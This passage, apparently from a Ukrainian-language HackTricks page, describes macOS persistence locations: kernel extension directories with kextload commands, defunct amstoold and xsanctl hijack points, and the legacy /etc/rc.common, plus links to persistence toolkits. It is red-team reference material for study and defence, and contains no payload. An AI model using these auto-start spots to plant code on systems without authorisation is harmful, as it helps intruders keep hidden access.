Так складно встановити kext навіть як адміністратор, що я не розгляну це як можливість виходу з пісочниці або навіть для постійності (якщо у вас немає експлойту)
{% endhint %}

#### Місце розташування

Для встановлення KEXT як елемента автозапуску, його потрібно **встановити в одному з наступних місць**:

* `/System/Library/Extensions`
* Файли KEXT, вбудовані в операційну систему OS X.
* `/Library/Extensions`
* Файли KEXT, встановлені стороннім програмним забезпеченням

Ви можете перелічити поточно завантажені файли kext за допомогою:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Для отримання додаткової інформації про [**розширення ядра перевірте цей розділ**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Опис: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Місцезнаходження

* **`/usr/local/bin/amstoold`**
* Потрібні права адміністратора

#### Опис та експлуатація

Здається, `plist` з `/System/Library/LaunchAgents/com.apple.amstoold.plist` використовував цей бінарний файл, викладаючи сервіс XPC... справа в тому, що бінарний файл не існував, тому ви могли помістити туди щось, і коли сервіс XPC буде викликаний, буде викликаний ваш бінарний файл.

Я більше не можу знайти це в моєму macOS.

### ~~xsanctl~~

Опис: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Місцезнаходження

* **`/Library/Preferences/Xsan/.xsanrc`**
* Потрібні права адміністратора
* **Тригер**: Коли сервіс запускається (рідко)

#### Опис та експлуатація

Здається, цей скрипт не дуже часто використовується, і я навіть не можу знайти його в моєму macOS, тому якщо ви хочете отримати більше інформації, перевірте опис.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Це не працює в сучасних версіях MacOS**
{% endhint %}

Також можна помістити тут **команди, які будуть виконуватися при запуску.** Приклад звичайного скрипту rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Техніки та інструменти постійності

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>
